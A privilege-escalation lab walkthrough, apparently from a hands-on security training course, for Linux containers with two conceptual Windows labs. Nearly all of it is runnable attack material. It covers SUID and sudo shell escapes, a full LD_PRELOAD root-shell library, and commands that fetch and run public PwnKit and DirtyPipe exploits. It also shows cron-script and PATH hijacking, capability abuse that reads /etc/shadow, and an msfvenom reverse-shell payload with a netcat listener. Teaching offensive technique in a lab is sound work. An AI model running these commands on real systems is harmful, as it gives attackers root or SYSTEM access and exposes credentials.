# Privilege Escalation Walkthrough

Step-by-step guide for escalating privileges on Linux and Windows systems.

---

## Lab 1: SUID Binary Exploitation

**Target:** CyberLab Docker containers

### Step 1: Connect to Target

```bash
# Connect to the buffer overflow container
docker exec -it lab-buffer-overflow /bin/bash

# Or connect via vulnerable SSH
ssh -p 2222 labuser@localhost
# Password: labpass123
```

### Step 2: Identify Current User

```bash
# Check current user context
id
whoami

# Check what groups you belong to
groups

# Example output:
# uid=1000(labuser) gid=1000(labuser) groups=1000(labuser)
```

### Step 3: Find SUID Binaries

```bash
# Search for SUID binaries
find / -perm -4000 -type f 2>/dev/null

# Get detailed listing
find / -perm -4000 -type f -ls 2>/dev/null

# Common results to look for:
# /usr/bin/find
# /usr/bin/vim
# /usr/bin/python3
# /usr/bin/less
# /usr/bin/env
```

### Step 4: Analyze Each Binary

```bash
# For each SUID binary found, check:
# 1. What does it do?
# 2. Is it on GTFOBins?
# 3. Can it spawn a shell?

# Example: found /usr/bin/find with SUID
ls -la /usr/bin/find
# -rwsr-xr-x 1 root root 213600 Feb 14 2022 /usr/bin/find
# The 's' in 'rws' indicates SUID
```

### Step 5: Exploit Using GTFOBins

```bash
# If find has SUID:
find . -exec /bin/sh -p \; -quit

# Verify you're root
id
# uid=1000(labuser) gid=1000(labuser) euid=0(root) groups=1000(labuser)

# The euid=0 means effective user ID is root!
```

### Step 6: Other SUID Exploits

```bash
# If vim has SUID:
vim -c ':!/bin/sh -p'
# Then in vim:
# :set shell=/bin/sh
# :shell

# If python3 has SUID:
python3 -c 'import os; os.execl("/bin/sh", "sh", "-p")'

# If less has SUID:
less /etc/passwd
!/bin/sh -p

# If env has SUID:
env /bin/sh -p

# If nmap (old) has SUID:
nmap --interactive
!sh
```

### Step 7: Get the Flag

```bash
# As root, read the flag
cat /root/flag.txt
# FLAG{su1d_pr1v3sc_pwn3d}
```

---

## Lab 2: Sudo Misconfigurations

### Step 1: Connect and Check Sudo

```bash
# Connect to target
ssh -p 2222 labuser@localhost
# Password: labpass123

# Check sudo permissions
sudo -l

# Example vulnerable output:
# Matching Defaults entries for labuser:
#     env_keep+=LD_PRELOAD
#
# User labuser may run the following commands:
#     (ALL) NOPASSWD: /usr/bin/vim
#     (ALL) NOPASSWD: /usr/bin/find
#     (ALL) NOPASSWD: /usr/bin/env
```

### Step 2: Exploit Sudo vim

```bash
# If you can sudo vim:
sudo vim -c ':!/bin/bash'

# Alternative:
sudo vim
# Then in vim, type:
:!/bin/bash
```

### Step 3: Exploit Sudo find

```bash
# If you can sudo find:
sudo find /tmp -exec /bin/bash \; -quit

# Verify:
id
# uid=0(root) gid=0(root) groups=0(root)
```

### Step 4: Exploit Sudo env

```bash
# If you can sudo env:
sudo env /bin/bash

# This gives you a root shell immediately
```

### Step 5: Exploit LD_PRELOAD

If `env_keep+=LD_PRELOAD` is in the sudo configuration:

```bash
# Create the exploit
cat << 'EOF' > /tmp/preload.c
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

void _init() {
    unsetenv("LD_PRELOAD");
    setgid(0);
    setuid(0);
    execl("/bin/bash", "bash", NULL);
}
EOF

# Compile
gcc -fPIC -shared -o /tmp/preload.so /tmp/preload.c -nostartfiles

# Exploit using any allowed sudo command
sudo LD_PRELOAD=/tmp/preload.so /usr/bin/find

# You should now have a root shell
```

### Step 6: Sudo Version Vulnerabilities

```bash
# Check sudo version
sudo --version

# If sudo < 1.9.5p2, might be vulnerable to Baron Samedit (CVE-2021-3156)
# Test with:
sudoedit -s '\' $(python3 -c 'print("A"*1000)')

# If it crashes/hangs, might be vulnerable
# Use exploit: https://github.com/worawit/CVE-2021-3156
```

---

## Lab 3: Kernel Exploitation

### Step 1: Gather System Information

```bash
# Kernel version
uname -a
uname -r

# Distribution
cat /etc/*release*
cat /etc/issue

# CPU architecture
uname -m
arch
```

### Step 2: Run Linux Exploit Suggester

```bash
# Download
curl -L https://raw.githubusercontent.com/mzet-/linux-exploit-suggester/master/linux-exploit-suggester.sh -o les.sh
chmod +x les.sh

# Run
./les.sh

# Example output:
# [+] [CVE-2021-4034] PwnKit
#   Details: https://www.qualys.com/2022/01/25/cve-2021-4034/pwnkit.txt
#   Exposure: probable
#   Tags: [ ubuntu=10.04|16.04|18.04|20.04|21.04|21.10 ]
```

### Step 3: PwnKit Exploitation (CVE-2021-4034)

```bash
# Check if polkit is installed
which pkexec
dpkg -l | grep policykit

# Download exploit
curl -fsSL https://raw.githubusercontent.com/ly4k/PwnKit/main/PwnKit -o PwnKit
chmod +x PwnKit

# Run
./PwnKit

# Should give root shell
```

### Step 4: Dirty Pipe (CVE-2022-0847)

```bash
# Check kernel version (vulnerable: 5.8 - 5.16.11)
uname -r

# If vulnerable:
git clone https://github.com/Arinerron/CVE-2022-0847-DirtyPipe-Exploit
cd CVE-2022-0847-DirtyPipe-Exploit
./compile.sh
./exploit

# This makes /bin/su SUID
# Then:
su
# Password: (empty/any)
```

### Step 5: Check Results

```bash
# Verify root access
id
whoami

# Get the flag
cat /root/flag.txt
# FLAG{k3rn3l_pwn3d}
```

---

## Lab 4: Cron Job Exploitation

### Step 1: Enumerate Cron Jobs

```bash
# System crontab
cat /etc/crontab

# Example output:
# SHELL=/bin/bash
# PATH=/home/labuser:/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin
#
# * * * * * root /opt/scripts/backup.sh

# Check cron.d
ls -la /etc/cron.d/
cat /etc/cron.d/*

# Check user crontabs
crontab -l
```

### Step 2: Monitor Processes

```bash
# Download pspy for process monitoring
wget https://github.com/DominicBreuker/pspy/releases/download/v1.2.1/pspy64
chmod +x pspy64
./pspy64

# Or manual monitoring
watch -n 1 'ps aux | grep -v watch | grep root'
```

### Step 3: Check Script Permissions

```bash
# Check if cron script is writable
ls -la /opt/scripts/backup.sh

# If writable:
# -rwxrwxrwx 1 root root 54 Jan 15 10:00 /opt/scripts/backup.sh
```

### Step 4: Exploit Writable Cron Script

```bash
# Add malicious command to the script
echo 'cp /bin/bash /tmp/rootbash; chmod +s /tmp/rootbash' >> /opt/scripts/backup.sh

# Wait for cron to run (check /etc/crontab for schedule)
# Then exploit:
/tmp/rootbash -p

# Verify
id
# uid=1000(labuser) gid=1000(labuser) euid=0(root)
```

### Step 5: PATH Hijacking

If crontab has a custom PATH that includes a writable directory:

```bash
# Check crontab PATH
cat /etc/crontab
# PATH=/home/labuser:/usr/local/sbin:...

# If script uses commands without full path (e.g., just "tar"):
# Create malicious tar in writable PATH directory
cat << 'EOF' > /home/labuser/tar
#!/bin/bash
cp /bin/bash /tmp/rootbash
chmod +s /tmp/rootbash
EOF
chmod +x /home/labuser/tar

# Wait for cron, then:
/tmp/rootbash -p
```

---

## Lab 5: Capabilities Abuse

### Step 1: Find Binaries with Capabilities

```bash
# Search for capabilities
getcap -r / 2>/dev/null

# Example output:
# /usr/bin/python3.8 cap_setuid=ep
# /usr/bin/perl = cap_setuid+ep
```

### Step 2: Exploit Python with cap_setuid

```bash
# If python has cap_setuid capability:
/usr/bin/python3 -c 'import os; os.setuid(0); os.execl("/bin/bash", "bash")'

# Verify
id
# uid=0(root) gid=1000(labuser) groups=1000(labuser)
```

### Step 3: Exploit Perl with cap_setuid

```bash
# If perl has cap_setuid capability:
/usr/bin/perl -e 'use POSIX; POSIX::setuid(0); exec "/bin/bash";'
```

### Step 4: Exploit tar with cap_dac_read_search

```bash
# If tar can read any file:
tar -cvf shadow.tar /etc/shadow
tar -xvf shadow.tar
cat etc/shadow

# Crack the hashes offline
```

---

## Lab 6: Windows Service Exploitation (Concept)

### Step 1: Find Unquoted Service Paths

```powershell
# Find vulnerable services
wmic service get name,displayname,pathname,startmode | findstr /i "auto" | findstr /i /v "c:\windows\\" | findstr /i /v """"

# Example vulnerable path:
# ServiceName - C:\Program Files\My App\service.exe
```

### Step 2: Check Write Permissions

```powershell
# Check if you can write to the path
icacls "C:\Program Files"
icacls "C:\Program Files\My App"

# Look for (W) or (F) permissions for your user/group
```

### Step 3: Create Payload

```bash
# On attacker machine
msfvenom -p windows/x64/shell_reverse_tcp LHOST=YOUR_IP LPORT=4444 -f exe > My.exe

# Start listener
nc -lvnp 4444
```

### Step 4: Place and Trigger

```powershell
# Copy payload
copy My.exe "C:\Program Files\My.exe"

# Restart service
sc stop "ServiceName"
sc start "ServiceName"
```

---

## Lab 7: Token Impersonation (Concept)

### Step 1: Check Privileges

```powershell
# Check current privileges
whoami /priv

# Look for:
# SeImpersonatePrivilege    Impersonate a client after authentication    Enabled
```

### Step 2: Use PrintSpoofer

```powershell
# Download PrintSpoofer to target
# https://github.com/itm4n/PrintSpoofer

# Get SYSTEM shell
.\PrintSpoofer64.exe -i -c cmd.exe

# Verify
whoami
# nt authority\system
```

---

## Practice Exercises

### Exercise 1: Complete Privesc Chain

```bash
# Start with SSH access
ssh -p 2222 labuser@localhost

# Goal: Get root and find all flags
# 1. Check sudo -l
# 2. Find SUID binaries
# 3. Check crontabs
# 4. Find capabilities
# 5. Run LinPEAS
# 6. Exploit what you find
```

### Exercise 2: Time-Based Challenge

```bash
# You have 30 minutes to:
# 1. Enumerate the system
# 2. Find at least 2 privesc vectors
# 3. Successfully escalate to root
# 4. Document your findings

# Tips:
# - Start with quick checks (sudo -l, SUID)
# - Move to automated tools if stuck
# - Keep notes of everything you find
```

### Exercise 3: Multiple Containers

```bash
# Try privesc on different containers:
docker exec -it lab-dvwa /bin/bash
docker exec -it lab-buffer-overflow /bin/bash

# Compare findings between systems
# What's different? What's the same?
```

---

## Key Takeaways

1. **Always enumerate first** - Don't jump to exploits without understanding the environment
2. **Check the easy stuff first** - sudo -l and SUID often give quick wins
3. **Know your references** - GTFOBins, LOLBAS are essential resources
4. **Kernel exploits are risky** - They can crash systems, use as last resort
5. **Document everything** - Keep track of what you've tried and found
6. **Multiple vectors exist** - If one fails, try another approach

---

**Next:** [Hints](./hints.md) | **Continue to:** [04 - Buffer Overflow](../04-buffer-overflow/)
